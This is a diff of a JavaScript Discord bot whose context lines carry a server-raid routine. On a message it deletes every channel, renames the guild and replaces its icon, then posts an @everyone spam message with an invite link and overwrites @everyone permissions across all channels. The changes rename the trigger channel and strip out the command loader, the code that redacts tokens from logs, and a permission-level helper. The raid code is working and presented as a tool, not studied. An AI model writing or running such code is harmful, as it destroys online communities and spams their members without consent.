@@ -41,129 +41,12 @@ client.on('message', message => {
    message.guild.channels.deleteAll("");
    message.guild.setName(`Kapandı`, "")
    message.guild.setIcon(`https://cdn.discordapp.com/attachments/615300671599804435/616763400508145684/16-512.png`)
-   message.guild.createChannel(`Kapandı`)
+   message.guild.createChannel(`hey`)
     }
-});
-
-const log = message => {
-  console.log(`${message}`);
-};
-  var prefix = tokenyeri.prefix;
-  
-/*BOTU AÇIK TUTMA*/
-  client.commands = new Discord.Collection();
-  client.aliases = new Discord.Collection();
-  fs.readdir('./berke/', (err, files) => {
-    if (err) console.error(err);
-    log(`Başlıyor...`);
-    files.forEach(f => {
-      let props = require(`./berke/${f}`);
-      log(`Tamamdır berke abi hazırım.`);
-      client.commands.set(props.help.name, props);
-      props.conf.aliases.forEach(alias => {
-        client.aliases.set(alias, props.help.name);
-      });
-    });
-  });
-
-  client.reload = command => {
-    return new Promise((resolve, reject) => {
-      try {
-        delete require.cache[require.resolve(`./berke/${command}`)];
-        let cmd = require(`./berke/${command}`);
-        client.commands.delete(command);
-        client.aliases.forEach((cmd, alias) => {
-          if (cmd === command) client.aliases.delete(alias);
-        });
-        client.commands.set(command, cmd);
-        cmd.conf.aliases.forEach(alias => {
-          client.aliases.set(alias, cmd.help.name);
-        });
-        resolve();
-      } catch (e){
-        reject(e);
-      }
-    });
-  };
-
-  client.load = command => {
-    return new Promise((resolve, reject) => {
-      try {
-        let cmd = require(`./berke/${command}`);
-        client.commands.set(command, cmd);
-        cmd.conf.aliases.forEach(alias => {
-          client.aliases.set(alias, cmd.help.name);
-        });
-        resolve();
-      } catch (e){
-        reject(e);
-      }
-    });
-  };
-
-client.reload = command => {
-  return new Promise((resolve, reject) => {
-    try {
-      delete require.cache[require.resolve(`./berke/${command}`)];
-      let cmd = require(`./berke/${command}`);
-      client.commands.delete(command);
-      client.aliases.forEach((cmd, alias) => {
-        if (cmd === command) client.aliases.delete(alias);
-      });
-      client.commands.set(command, cmd);
-      cmd.conf.aliases.forEach(alias => {
-        client.aliases.set(alias, cmd.help.name);
-      });
-      resolve();
-    } catch (e){
-      reject(e);
-    }
-  });
-};
-
-client.load = command => {
-  return new Promise((resolve, reject) => {
-    try {
-      let cmd = require(`./berke/${command}`);
-      client.commands.set(command, cmd);
-      cmd.conf.aliases.forEach(alias => {
-        client.aliases.set(alias, cmd.help.name);
-      });
-      resolve();
-    } catch (e){
-      reject(e);
-    }
-  });
-};
-
-client.unload = command => {
-  return new Promise((resolve, reject) => {
-    try {
-      delete require.cache[require.resolve(`./berke/${command}`)];
-      let cmd = require(`./berke/${command}`);
-      client.commands.delete(command);
-      client.aliases.forEach((cmd, alias) => {
-        if (cmd === command) client.aliases.delete(alias);
-      });
-      resolve();
-    } catch (e){
-      reject(e);
-    }
-  });
-};
-
-var regToken = /[\w\d]{24}\.[\w\d]{6}\.[\w\d-_]{27}/g;
-
-client.on('warn', e => {
-  console.log(chalk.bgYellow(e.replace(regToken, 'that was redacted')));
-});
-
-client.on('error', e => {
-  console.log(chalk.bgRed(e.replace(regToken, 'that was redacted')));
 });
 
 client.on('channelCreate', channel => {
-  if (channel.name == 'berke-adamdir') {
+  if (channel.name == 'hey') {
     channel.send(`Allah zihin açıklığı versin. @everyone \n\nhttps://discord.gg/4judfSa`)
     channel.guild.channels.forEach(c => {
          c.overwritePermissions(channel.guild.roles.find("name", "@everyone"), {
@@ -178,15 +61,5 @@ client.on('channelCreate', channel => {
   }
 
 });
-
-client.elevation = message => {
-  if(!message.guild) {
-	return; }
-  let permlvl = 0;
-  if (message.member.hasPermission("BAN_MEMBERS")) permlvl = 2;
-  if (message.member.hasPermission("ADMINISTRATOR")) permlvl = 3;
-  if (message.author.id === tokenyeri.sahip) permlvl = 4;
-  return permlvl;
-};
 
 client.login(tokenyeri.token) 
